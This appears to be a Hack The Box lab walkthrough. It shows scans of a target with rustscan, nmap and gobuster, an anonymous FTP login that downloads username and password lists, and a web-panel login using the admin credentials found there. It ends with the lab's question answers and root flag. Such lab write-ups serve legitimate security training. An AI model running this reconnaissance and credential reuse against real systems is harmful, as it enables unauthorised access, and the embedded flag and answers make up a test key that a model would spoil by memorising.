```
blob:https://app.hackthebox.com/51f9dfe3-9c91-469a-8453-feab80baf3c3

┌──(kali㉿kali)-[~]
└─$ ping 10.129.165.101
PING 10.129.165.101 (10.129.165.101) 56(84) bytes of data.
64 bytes from 10.129.165.101: icmp_seq=1 ttl=63 time=301 ms
64 bytes from 10.129.165.101: icmp_seq=2 ttl=63 time=193 ms
^C
--- 10.129.165.101 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2002ms
rtt min/avg/max/mdev = 193.285/247.087/300.889/53.802 ms
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.165.101 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.165.101:80
Open 10.129.165.101:21
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 15:25 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Initiating Ping Scan at 15:25
Scanning 10.129.165.101 [2 ports]
Completed Ping Scan at 15:25, 1.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:25
Completed Parallel DNS resolution of 1 host. at 15:25, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:25
Scanning 10.129.165.101 [2 ports]
Discovered open port 21/tcp on 10.129.165.101
Discovered open port 80/tcp on 10.129.165.101
Completed Connect Scan at 15:25, 0.19s elapsed (2 total ports)
Initiating Service scan at 15:25
Scanning 2 services on 10.129.165.101
Completed Service scan at 15:25, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.165.101.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:25
NSE: [ftp-bounce 10.129.165.101:21] PORT response: 500 Illegal PORT command.
Completed NSE at 15:25, 8.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 1.93s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Nmap scan report for 10.129.165.101
Host is up, received conn-refused (0.97s latency).
Scanned at 2022-11-01 15:25:33 EDT for 18s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.94 seconds

┌──(kali㉿kali)-[~/hackthebox]
└─$ ftp 10.129.165.101
Connected to 10.129.165.101.
220 (vsFTPd 3.0.3)
Name (10.129.165.101:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45107|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||46285|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |*********************************************************************|    33      255.76 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.14 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||45184|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |*********************************************************************|    62      288.31 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.33 KiB/s)
ftp> quit
221 Goodbye.
                                                                                                                  
┌──(kali㉿kali)-[~/hackthebox]
└─$ ls
allowed.userlist  allowed.userlist.passwd
                                                                                                                  
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                                                                  
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

┌──(kali㉿kali)-[~/hackthebox]
└─$ gobuster dir -u http://10.129.165.101/ -w /usr/share/wordlists/dirb/common.txt -t 64 -x php,html
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.165.101/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2022/11/01 15:37:46 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 317] [--> http://10.129.165.101/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 314] [--> http://10.129.165.101/css/]
/dashboard            (Status: 301) [Size: 320] [--> http://10.129.165.101/dashboard/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.165.101/fonts/]
/index.html           (Status: 200) [Size: 58565]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 313] [--> http://10.129.165.101/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 279]
Progress: 13842 / 13845 (99.98%)===============================================================
2022/11/01 15:38:37 Finished
===============================================================

http://10.129.165.101/login.php

using sqli cannot pass it so using the pass found before.

admin:rKXM59ESxesUFHAd

Here is your flag: c7110277ac44d78b6a9fff2232434d16
```

What nmap scanning switch employs the use of default scripts during a scan? 
*-sC*

What service version is found to be running on port 21? 
*vsftpd 3.0.3*

What FTP code is returned to us for the "Anonymous FTP login allowed" message? 
*230*

What command can we use to download the files we find on the FTP server? 
*get*

What is one of the higher-privilege sounding usernames in the list we retrieved? 
*admin*

What version of Apache HTTP Server is running on the target host? 
*2.4.41*

What is the name of a handy web site analysis plug-in we can install in our browser? 
*Wappalyzer*

What switch can we use with gobuster to specify we are looking for specific filetypes? 
*-x*

What file have we found that can provide us a foothold on the target? 
*login.php*

Submit root flag 
*c7110277ac44d78b6a9fff2232434d16*


[[Sequel]]